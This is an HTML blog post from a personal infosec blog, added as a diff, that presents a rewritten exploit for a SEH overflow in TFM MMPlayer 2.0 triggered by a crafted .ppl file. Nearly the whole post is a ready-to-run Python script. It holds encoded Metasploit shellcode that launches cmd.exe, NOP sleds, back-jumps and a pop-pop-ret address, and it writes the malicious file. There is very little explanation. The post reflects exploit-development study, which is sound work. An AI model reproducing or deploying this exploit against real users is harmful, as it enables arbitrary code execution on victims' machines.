@@ -1,0 +1,335 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <title>7h3rAm's Infosec Ramblings</title>
+    <meta charset="utf-8"/>
+    <meta content="7h3rAm" name="author"/>
+    <meta content="width=device-width, initial-scale=1" name="viewport"/>
+
+    <script src="/static/js/jquery/jquery-1.10.2.js"></script>
+    <link href="/static/css/bootstrap/bootstrap.3.3.6.min.css" rel="stylesheet" type="text/css">
+    <link href="/static/css/font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+    <link href="/static/css/morrisjs/morris.css" rel="stylesheet" type="text/css">
+    <link href="/static/css/timeline/timeline.css" rel="stylesheet" type="text/css">
+    <link href="/static/css/main.css" rel="stylesheet" type="text/css">
+    <link href="/static/css/codehilite/zenburn.css" rel="stylesheet" type="text/css">
+    <link href="/static/images/favicon.ico" rel="icon" type="image/x-icon"/>
+
+    <!-- Google Analytics -->
+    <script>
+    window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+    ga('create', 'UA-50288765-1', '7h3rAm.github.io');
+    ga('send', 'pageview');
+    </script>
+    <script async src='http://www.google-analytics.com/analytics.js'></script>
+    <!-- End Google Analytics -->
+
+  </head>
+  <body id="index" class="home">
+    <header class="header">
+      <nav>
+        <ul>
+          <li><a href="/"><i class="fa fa-home"></i> Home</a></li>
+          <li><a href="/archive.html"><i class="fa fa-archive"></i> Archive</a></li>
+          <li><a href="/tags.html"><i class="fa fa-tags"></i> Tags</a></li>
+          <li><a href="/dashboard.html"><i class="fa fa-bar-chart"></i> Dashboard</a></li>
+          <li><a href="/research.html"><i class="fa fa-list-alt"></i> Research</a></li>
+        </ul>
+      </nav>
+    </header>
+    <section id="content" class="body">
+      
+  
+  
+  <article class="post">
+  <div class="row">
+    <div class="col-lg-12">
+      <div class="panel panel-default">
+        <div class="panel-heading post-title">
+          TFM MMPlayer .ppl File Parsing SEH Overflow
+        </div>
+        <div class="panel-body">
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+              
+                
+                
+              
+              
+                
+                
+              
+              
+                <p class="post-date">
+                  <a href="/2012/shadow-stream-recorder-asx-jmpesp.html"><i class="fa fa-angle-double-left"></i></a> published on September 2, 2012<a href="/2013/geras-wuos-stack2-solutions.html"> <i class="fa fa-angle-double-right"></i></a><br/>
+                  readtime: 5 minutes and 13 seconds (view <a href="https://raw.githubusercontent.io/7h3rAm/7h3rAm.github.io/master/_posts/tfm-mmplayer-ppl-seh.md">source</a>)
+                </p>
+              
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+        <div class="post-summary">TFM MMPlayer SEH overflow via a pop-pop-return overwrite and negative jumps.</div>
+        <div class="post-content">
+          <p>The TFM MMPlayer version 2.0 has a SEH overflow vulnerability.
+Processing specially-crafted <code>.ppl</code> file triggers SEH overwrite that
+could be leveraged further to gain arbitrary code execution. The exploit
+for this vulnerability has been documeneted at <a href="http://www.exploit-db.com/exploits/19176/">EDB:
+19176</a></p>
+
+<p>Here is a complete rewrite of this exploit:</p>
+
+<div class="codehilite"><pre><code><span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="nb">file</span> <span class="o">=</span> <span class="s">&quot;edb19176.ppl&quot;</span>
+
+<span class="c"># msfpayload windows/exec CMD=cmd.exe R | msfencode -b &#39;\x00\x0a\x0d&#39; -t perl</span>
+<span class="c"># [*] x86/shikata_ga_nai succeeded with size 226 (iteration=1)</span>
+
+<span class="n">cmmd</span> <span class="o">=</span> <span class="p">(</span><span class="s">&quot;</span><span class="se">\xda\xd5\xb8\x4f\xc1\x95\xae\xd9\x74\x24\xf4\x5a\x29\xc9</span><span class="s">&quot;</span> <span class="o">+</span>
+<span class="s">&quot;</span><span class="se">\xb1\x32\x83\xc2\x04\x31\x42\x16\x03\x42\x16\xe2\xba\x3d</span><span class="s">&quot;</span> <span class="o">+</span>
+<span class="s">&quot;</span><span class="se">\x7d\x27\x44\xbe\x7e\x58\xcd\x5b\x4f\x4a\xa9\x28\xe2\x5a</span><span class="s">&quot;</span> <span class="o">+</span>
+<span class="s">&quot;</span><span class="se">\xba\x7d\x0f\x10\xee\x95\x84\x54\x26\x99\x2d\xd2\x10\x94</span><span class="s">&quot;</span> <span class="o">+</span>
+<span class="s">&quot;</span><span class="se">\xae\xd2\x9c\x7a\x6c\x74\x60\x81\xa1\x56\x59\x4a\xb4\x97</span><span class="s">&quot;</span> <span class="o">+</span>
+<span class="s">&quot;</span><span class="se">\x9e\xb7\x37\xc5\x77\xb3\xea\xfa\xfc\x81\x36\xfa\xd2\x8d</span><span class="s">&quot;</span> <span class="o">+</span>
+<span class="s">&quot;</span><span class="se">\x07\x84\x57\x51\xf3\x3e\x56\x82\xac\x35\x10\x3a\xc6\x12</span><span class="s">&quot;</span> <span class="o">+</span>
+<span class="s">&quot;</span><span class="se">\x80\x3b\x0b\x41\xfc\x72\x20\xb2\x77\x85\xe0\x8a\x78\xb7</span><span class="s">&quot;</span> <span class="o">+</span>
+<span class="s">&quot;</span><span class="se">\xcc\x41\x47\x77\xc1\x98\x80\xb0\x3a\xef\xfa\xc2\xc7\xe8</span><span class="s">&quot;</span> <span class="o">+</span>
+<span class="s">&quot;</span><span class="se">\x39\xb8\x13\x7c\xdf\x1a\xd7\x26\x3b\x9a\x34\xb0\xc8\x90</span><span class="s">&quot;</span> <span class="o">+</span>
+<span class="s">&quot;</span><span class="se">\xf1\xb6\x96\xb4\x04\x1a\xad\xc1\x8d\x9d\x61\x40\xd5\xb9</span><span class="s">&quot;</span> <span class="o">+</span>
+<span class="s">&quot;</span><span class="se">\xa5\x08\x8d\xa0\xfc\xf4\x60\xdc\x1e\x50\xdc\x78\x55\x73</span><span class="s">&quot;</span> <span class="o">+</span>
+<span class="s">&quot;</span><span class="se">\x09\xfa\x34\x1e\xcc\x8e\x43\x67\xce\x90\x4b\xc8\xa7\xa1</span><span class="s">&quot;</span> <span class="o">+</span>
+<span class="s">&quot;</span><span class="se">\xc0\x87\xb0\x3d\x03\xec\x4f\x74\x09\x45\xd8\xd1\xd8\xd7</span><span class="s">&quot;</span> <span class="o">+</span>
+<span class="s">&quot;</span><span class="se">\x85\xe1\x37\x1b\xb0\x61\xbd\xe4\x47\x79\xb4\xe1\x0c\x3d</span><span class="s">&quot;</span> <span class="o">+</span>
+<span class="s">&quot;</span><span class="se">\x25\x98\x1d\xa8\x49\x0f\x1d\xf9\x2a\xc2\x85\x2c\xc9\x64</span><span class="s">&quot;</span> <span class="o">+</span>
+<span class="s">&quot;</span><span class="se">\x23\x31</span><span class="s">&quot;</span><span class="p">)</span>
+
+<span class="n">nop1</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\x90</span><span class="s">&quot;</span><span class="o">*</span><span class="mi">3777</span>
+<span class="n">nop2</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\x90</span><span class="s">&quot;</span><span class="o">*</span><span class="mi">100</span>
+<span class="n">jmp2</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\xE9\xA8\xFD\xFF\xFF</span><span class="s">&quot;</span> <span class="c"># near jump (back) 600B (0xFFFFFDA8)</span>
+<span class="n">nseh</span> <span class="o">=</span> <span class="n">pack</span> <span class="p">(</span><span class="s">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x9090C4EB</span><span class="p">)</span><span class="c"># short jump (back) 60B (0xFFC4)</span>
+<span class="n">cseh</span> <span class="o">=</span> <span class="n">pack</span> <span class="p">(</span><span class="s">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x00401390</span><span class="p">)</span><span class="c"># p/p/r 00401390 MMPlayer.exe</span>
+
+<span class="n">sploit</span> <span class="o">=</span> <span class="n">nop1</span><span class="o">+</span><span class="n">cmmd</span><span class="o">+</span><span class="n">nop2</span><span class="o">+</span><span class="n">jmp2</span><span class="o">+</span><span class="n">nseh</span><span class="o">+</span><span class="n">cseh</span>
+<span class="c">#3777 226  100  544</span>
+
+<span class="k">try</span><span class="p">:</span>
+<span class="n">handle</span> <span class="o">=</span> <span class="nb">open</span> <span class="p">(</span><span class="nb">file</span><span class="p">,</span> <span class="s">&#39;w&#39;</span><span class="p">)</span>
+<span class="n">handle</span><span class="o">.</span><span class="n">write</span> <span class="p">(</span><span class="n">sploit</span><span class="p">)</span>
+<span class="n">handle</span><span class="o">.</span><span class="n">close</span> <span class="p">()</span>
+<span class="k">print</span> <span class="s">&quot;[+] sploit ready: &quot;</span> <span class="o">+</span> <span class="nb">file</span> <span class="o">+</span> <span class="s">&quot; (&quot;</span> <span class="o">+</span> <span class="nb">str</span> <span class="p">(</span><span class="nb">len</span> <span class="p">(</span><span class="n">sploit</span><span class="p">))</span> <span class="o">+</span> <span class="s">&quot;B)&quot;</span>
+<span class="k">except</span><span class="p">:</span>
+<span class="k">print</span> <span class="s">&quot;[-] exception!&quot;</span>
+
+<span class="sd">&#39;&#39;&#39;</span>
+<span class="sd">/SafeSEH Module Scanner, item 18</span>
+<span class="sd"> SEH mode=/SafeSEH OFF</span>
+<span class="sd"> Base=0x400000</span>
+<span class="sd"> Limit=0x47c000</span>
+<span class="sd"> Module version=2.2.0.30</span>
+<span class="sd"> Module Name=MMPlayer.exe</span>
+<span class="sd">&#39;&#39;&#39;</span>
+</code></pre></div>
+
+        </div>
+        <div class="post-bottomline">
+          <hr/>
+          <p>For comments, questions and suggestions use <a href="https://twitter.com/7h3rAm" target="_blank"><i class="fa fa-twitter"></i></a> or create an <a href="https://github.com/7h3rAm/7h3rAm.github.io/issues/new" target="_blank"><i class="fa fa-exclamation-circle"></i> issue</a> on blog reporsitory.</p>
+          <hr/>
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+              
+                
+                
+              
+              
+                
+                
+              
+              <table>
+                <tr>
+                  <td align="left">(share via <a href="mailto:?subject=TFM MMPlayer .ppl File Parsing SEH Overflow&body=/2012/tfm-mmplayer-ppl-seh.html" target="_blank" title="Share via Email"><i class="fa fa-inbox"></i></a> <a href="http://twitter.com/intent/tweet?text=TFM MMPlayer .ppl File Parsing SEH Overflow+/2012/tfm-mmplayer-ppl-seh.html&via=7h3rAm" target="_blank" title="Share on Twitter"><i class="fa fa-twitter"></i></a> <a href="http://www.facebook.com/sharer/sharer.php?s=100&p[url]=/2012/tfm-mmplayer-ppl-seh.html&p[images][0]=&p[title]=TFM MMPlayer .ppl File Parsing SEH Overflow&p[summary]=TFM MMPlayer SEH overflow via a pop-pop-return overwrite and negative jumps." target="_blank" title="Share on Facebook"><i class="fa fa-facebook"></i></a> <a href="https://plus.google.com/share?url=/2012/tfm-mmplayer-ppl-seh.html" target="_blank" title="Share on Google Plus"><i class="fa fa-google-plus"></i></a>)</td>
+                  <td align="right">(tagged <a href=/tags.html#exploit>exploit</a> and <a href=/tags.html#buffer_overflow>buffer_overflow</a>)</td>
+                </tr>
+                <tr>
+                  
+                    <td align="left"><a href="/2012/shadow-stream-recorder-asx-jmpesp.html"><i class="fa fa-angle-double-left"></i> Shadow Stream Recorder .asx File Parsing Buffer Overflow <i class="fa fa-angle-double-left"></i></a></td>
+                    <td align="right"><a href="/2013/geras-wuos-stack2-solutions.html"><i class="fa fa-angle-double-right"></i> Gera's Warming Up on Stack #2 - Solutions <i class="fa fa-angle-double-right"></i></a></td>
+                  
+                </tr>
+              </table>
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="row">
+    <div class="col-lg-12">
+      <div class="panel panel-default">
+        <div class="panel-heading post-title">
+          Related Posts
+        </div>
+        <div class="panel-body">
+          
+            1. <a href="/2012/millenium-mpf-seh.html">Millennium MP3 Studio .mpf File Parsing SEH Overflow</a>
+            <div class="overview-date">September 2, 2012</div>
+            <br/>
+          
+            2. <a href="/2012/geras-wuos-stack1-solutions.html">Gera's Warming Up on Stack #1 - Solutions</a>
+            <div class="overview-date">August 27, 2012</div>
+            <br/>
+          
+            3. <a href="/2013/geras-wuos-stack5-solutions.html">Gera's Warming Up on Stack #5 - Solutions</a>
+            <div class="overview-date">January 5, 2013</div>
+            <br/>
+          
+        </div>
+      </div>
+    </div>
+  </div>
+
+  </article>
+
+    </section>
+    <footer class="footer">
+      <b><a href="/">Ankur Tyagi</a></b> (<b><a href="https://twitter.com/7h3rAm" target="_blank"><i class="fa fa-at"></i>7h3rAm</a></b>)
+      <br/>
+      Last updated on October 20, 2016 (<b><a href="/rss.xml"><i class="fa fa-rss"></i> rss</a></b> <b><a href="/sitemap.xml"><i class="fa fa-sitemap"></i> sitemap</a></b>)
+      <br/>
+      Published under <b><a href="http://creativecommons.org/licenses/by-nc-sa/4.0/" rel="license" target="_blank">by-nc-sa</a></b> and powered by <b><a alt="Linux" href="https://www.kernel.org/" target="_blank"><i class="fa fa-linux"></i></a></b>, <b><a alt="Kalpi" href="https://github.com/7h3rAm/kalpi/" target="_blank">kalpi</a></b>, <b><a href="http://git-scm.com/" target="_blank"><i class="fa fa-git"></i></a></b> and <b><a href="https://github.com/7h3rAm/7h3ram.github.io" target="_blank"><i class="fa fa-github"></i></a></b>
+    </footer>
+
+    <script src="/static/js/bootstrap/bootstrap.3.3.6.min.js"></script>
+    <script src="/static/js/raphael/raphael-min.js"></script>
+    <script src="/static/js/morrisjs/morris.min.js"></script>
+    <script src="/static/files/chart-data.js"></script>
+    <script src="/static/js/sprintf/sprintf.js"></script>
+    <script src="/static/js/underscore/underscore-min.js"></script>
+
+  </body>
+</html>
